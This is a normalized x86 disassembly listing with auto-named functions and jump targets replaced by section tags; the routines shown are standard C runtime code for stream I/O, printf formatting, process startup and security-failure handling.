mov eax [ ebp - 0x1c ]
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
jmp r-xdata
call sub_4083c5
retn
sub_405fcb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
test al 0x83
jne r-xdata
and eax 0xffffffef
cmp [ ebp + 0x10 ] 0x1
mov [ esi + 0xc ] eax
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
push esi
call sub_408ee9
mov eax [ esi + 0xc ]
pop ecx
test al al
jns r-xdata
push esi
call sub_405dd2
add [ ebp + 0xc ] eax
and [ ebp + 0x10 ] 0x0
pop ecx
pop esi
pop ebp
retn
test al 0x1
je r-xdata
and eax 0xfffffffc
mov [ esi + 0xc ] eax
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_408ec3
pop ecx
push eax
call sub_40973e
xor ecx ecx
add esp 0xc
cmp eax 0xffffffff
setne cl
lea eax [ ecx - 0x1 ]
test al 0x8
je r-xdata
test eax 0x400
jne r-xdata
mov [ esi + 0x18 ] 0x200
sub_406055
push 0xc
push r--data
call sub_408380
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x8 ]
call sub_407ed6
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405fcb
add esp 0xc
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4060c7
mov eax [ ebp - 0x1c ]
cmp esi 0x1
je r-xdata
call sub_4083c5
retn
cmp esi 0x2
jne r-xdata
sub_4060d1
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
or edi 0xffffffff
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x83
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax edi
jmp r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
push esi
call sub_408ee9
push esi
mov edi eax
call sub_4099ac
push esi
call sub_408ec3
push eax
call sub_4098e8
add esp 0x10
test eax eax
jns r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_409812
and [ esi + 0x1c ] 0x0
pop ecx
sub_40613e
push 0xc
push r--data
call sub_408380
or [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov esi [ ebp + 0x8 ]
test esi esi
setne al
test eax eax
jne r-xdata
test [ esi + 0xc ] 0x40
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
jmp r-xdata
push esi
call sub_407ed6
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_4060d1
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4061aa
jmp r-xdata
and [ esi + 0xc ] 0x0
call sub_4083c5
retn
mov eax [ ebp - 0x1c ]
sub_4061b2
push 0xc
push r--data
call sub_408380
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_407ed6
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_408ec3
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_4083c5
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40629e
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rwxdata
cmp eax 0xfffffffe
je r-xdata
push esi
call sub_4099dd
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rwxdata ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rwxdata
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_4062a6
push 0xc
push r--data
call sub_408380
xor edi edi
mov [ ebp - 0x1c ] edi
xor eax eax
mov esi [ ebp + 0x8 ]
cmp esi edi
setne al
cmp eax edi
jne r-xdata
push esi
call sub_407ed6
pop ecx
mov [ ebp - 0x4 ] edi
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
jmp r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
call sub_408ec3
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_4083c5
retn
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406392
mov eax [ ebp - 0x1c ]
dec [ esi + 0x4 ]
js r-xdata
mov ecx rwxdata
cmp eax 0xfffffffe
je r-xdata
push esi
call sub_4099dd
pop ecx
mov ecx [ esi ]
movzx eax [ ecx ]
inc ecx
mov [ esi ] ecx
jmp r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rwxdata ]
jmp r-xdata
mov [ ebp - 0x1c ] eax
mov eax rwxdata
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_40639a
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
dec [ edx + 0x4 ]
js r-xdata
push edx
call sub_4099dd
pop ecx
pop ebp
retn
mov ecx [ edx ]
movzx eax [ ecx ]
inc ecx
mov [ edx ] ecx
pop ebp
retn
sub_4063ba
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov esi ecx
mov [ ebp - 0x4 ] r--data
call sub_409b10
mov [ esi ] r--data
mov eax esi
pop esi
leave
retn
sub_4063eb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_409bf4
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_409e6d
pop ecx
sub_40642f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_409ff1
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_40a0e1
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rwxdata ] 0x1
mov edi rwxdata
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_409ca0
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_40a109
int3
or [ rwxdata ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_409b10
push sub_41f35e
mov [ rwxdata ] esi
call sub_409f9b
pop ecx
sub_40651f
push 0x58
push r--data
call sub_408380
lea eax [ ebp - 0x68 ]
push eax
call [ GetStartupInfoW@IAT ]
xor esi esi
cmp [ rwxdata ] esi
jne r-xdata
mov eax 0x5a4d
cmp [ __dos_header ] ax
je r-xdata
push esi
push esi
push 0x1
push esi
call [ HeapSetInformation@IAT ]
mov eax [ r--data ]
cmp [ eax + __dos_header ] 0x4550
jne r-xdata
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov ecx 0x10b
cmp [ eax + r--data ] cx
jne r-xdata
call sub_40b279
test eax eax
jne r-xdata
cmp [ eax + r--data ] 0xe
jbe r-xdata
call sub_40b0fe
test eax eax
jne r-xdata
push 0x1c
call sub_4064af
xor ecx ecx
cmp [ eax + r--data ] esi
setne cl
mov [ ebp - 0x1c ] ecx
call sub_40ad02
mov [ ebp - 0x4 ] esi
call sub_409431
test eax eax
jns r-xdata
push 0x10
call sub_4064af
call [ GetCommandLineA@IAT ]
mov [ rwxdata ] eax
call sub_40ac6b
mov [ rwxdata ] eax
call sub_40abb0
test eax eax
jns r-xdata
push 0x1b
call sub_40a4ef
call sub_40a92b
test eax eax
jns r-xdata
push 0x8
call sub_40a4ef
push 0x1
call sub_40a2ce
pop ecx
cmp eax esi
je r-xdata
push 0x9
call sub_40a4ef
call sub_40a8cc
test [ ebp - 0x3c ] 0x1
je r-xdata
push eax
call sub_40a4ef
push 0xa
pop ecx
movzx ecx [ ebp - 0x38 ]
jmp r-xdata
call sub_40a4d1
jmp r-xdata
push eax
call sub_40a4a5
push ecx
push eax
push esi
push __dos_header
call sub_405550
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_4083c5
retn
sub_406696
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rwxdata ] eax
mov [ rwxdata ] ecx
mov [ rwxdata ] edx
mov [ rwxdata ] ebx
mov [ rwxdata ] esi
mov [ rwxdata ] edi
mov [ rwxdata ] ss
mov [ rwxdata ] cs
mov [ rwxdata ] ds
mov [ rwxdata ] es
mov [ rwxdata ] fs
mov [ rwxdata ] gs
pushfd
pop [ rwxdata ]
mov eax [ ebp ]
mov [ rwxdata ] eax
mov eax [ ebp + 0x4 ]
mov [ rwxdata ] eax
lea eax [ ebp + 0x8 ]
mov [ rwxdata ] eax
mov eax [ ebp - 0x320 ]
mov [ rwxdata ] 0x10001
mov eax [ rwxdata ]
mov [ rwxdata ] eax
mov [ rwxdata ] 0xc0000409
mov [ rwxdata ] 0x1
mov eax [ rwxdata ]
mov [ ebp - 0x328 ] eax
mov eax [ rwxdata ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rwxdata ] eax
push 0x1
call sub_40b34c
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rwxdata ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_40b34c
pop ecx
sub_40679c
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_408ec3
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_4078ae
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_4078ae
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_407dff
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_408def
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_40b50c
pop ecx
test eax eax
jne r-xdata
call sub_407dff
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_408def
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_40b4c3
pop ecx
pop edi
mov eax rwxdata
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_40b3d9
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rwxdata ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_406900
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_40af3b
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rwxdata ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rwxdata ]
je r-xdata
mov ecx [ rwxdata ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rwxdata ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_40bf44
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_40b785
mov [ esi + 0x4 ] eax
sub_406998
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_40679c
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_4069cb
mov edi edi
push ebp
mov ebp esp
push esi
mov esi eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov ecx [ ebp + 0x10 ]
mov al [ ebp + 0x8 ]
dec [ ebp + 0xc ]
call sub_406998
cmp [ esi ] 0xffffffff
je r-xdata
pop esi
pop ebp
retn
sub_4069f1
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx ecx
call sub_4078ae
test [ edi + 0xc ] 0x40
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_4078ae
and [ eax ] 0x0
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test ebx ebx
jg r-xdata
add [ esi ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
mov ecx edi
dec ebx
call sub_406998
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
call sub_4078ae
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
leave
retn
call sub_4078ae
cmp [ eax ] 0x2a
jne r-xdata
call sub_4078ae
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov ecx edi
mov al 0x3f
call sub_406998
sub_406a9f
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x240 ] esi
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x238 ] eax
call sub_406900
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor esi esi
cmp edi esi
je r-xdata
push esi
call sub_408ec3
pop ecx
mov edx rwxdata
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ edi ]
xor ecx ecx
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x220 ] esi
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc edi
mov [ ebp - 0x23c ] edi
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rwxdata ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rwxdata ]
jmp r-xdata
mov edi [ ebp - 0x23c ]
mov al [ edi ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x260 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x260 ]
mov ebx [ ebp - 0x228 ]
xor esi esi
mov dl al
jmp r-xdata
sub_40765a
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_40c890
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_40b34c
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_405894
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_40b34c
pop ecx
sub_407783
mov edi edi
push ebp
mov ebp esp
push esi
push [ rwxdata ]
call [ DecodePointer@IAT ]
push [ ebp + 0x8 ]
mov esi eax
call [ EncodePointer@IAT ]
mov [ rwxdata ] eax
mov eax esi
pop esi
pop ebp
retn
sub_4077b7
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_40765a
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_4077f6
mov edi edi
push ebp
mov ebp esp
push [ rwxdata ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4077b7
int3
pop ebp
jmp eax
sub_407833
xor eax eax
push esi
push eax
push eax
push eax
push eax
push eax
call sub_4077f6
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_40765a
add esp 0x20
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
int3
sub_40786c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rwxdata ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rwxdata ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_4078d4
mov edi edi
push ebp
mov ebp esp
push esi
call sub_4078c1
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_40786c
pop ecx
mov esi eax
call sub_4078ae
mov [ eax ] esi
pop esi
pop ebp
retn
sub_4078f7
mov edi edi
push ebp
mov ebp esp
call sub_40aec2
test eax eax
jne r-xdata
call sub_4078ae
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_407918
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
call sub_4078ae
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
call sub_407823
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_40793d
mov edi edi
push ebp
mov ebp esp
call sub_40aec2
test eax eax
jne r-xdata
call sub_4078c1
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
xor eax eax
pop ebp
retn
push 0xc
pop eax
pop ebp
retn
sub_40795e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
call sub_4078c1
mov eax [ eax ]
mov [ esi ] eax
xor eax eax
call sub_407823
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_407983
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
and [ ebp - 0x20 ] 0x0
push edi
push 0x7
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
[ edi ]
pop edi
cmp [ ebp + 0xc ] eax
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
leave
retn
push esi
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
push [ ebp + 0x10 ]
mov [ ebp - 0x20 ] eax
push [ ebp + 0xc ]
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x1c ] 0x7fffffff
mov [ ebp - 0x14 ] 0x42
call sub_406a9f
add esp 0x10
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_40679c
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
mov [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_407a21
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push edi
push 0x7
xor edx edx
pop ecx
xor eax eax
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] edx
[ edi ]
pop edi
cmp [ ebp + 0xc ] edx
jne r-xdata
push [ ebp + 0x14 ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x1c ] 0x7fffffff
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
push eax
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x20 ] edx
call [ ebp + 0x8 ]
add esp 0x10
leave
retn
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
leave
retn
sub_407aef
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_40679c
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_407bb9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_406a9f
call sub_407aef
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_407be2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_406a9f
call sub_407aef
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_407c0c
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
pop ebp
retn
call sub_4078ae
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_407823
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_40ded0
call sub_407aef
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_4078ae
mov [ eax ] 0x22
sub_407ca0
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0x8 ]
push edi
test ebx ebx
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
call sub_407823
or eax 0xffffffff
pop ebp
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
call sub_4078ae
mov [ eax ] 0x16
jmp r-xdata
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jne r-xdata
call sub_407823
call sub_4078ae
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
cmp edi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax ]
push edi
push esi
